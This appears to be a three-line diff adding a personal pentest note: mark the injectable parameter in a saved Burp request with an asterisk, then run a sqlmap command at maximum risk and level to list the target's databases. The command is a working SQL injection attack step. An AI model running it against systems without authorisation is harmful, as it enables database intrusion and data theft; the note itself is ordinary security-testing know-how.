@@ -1,0 +1,3 @@
+the request file from burp , put a * on the paramter where sql injection is there
+SQL MAP COMMAND
+sqlmap -r req --dbs --risk 3 --level 5
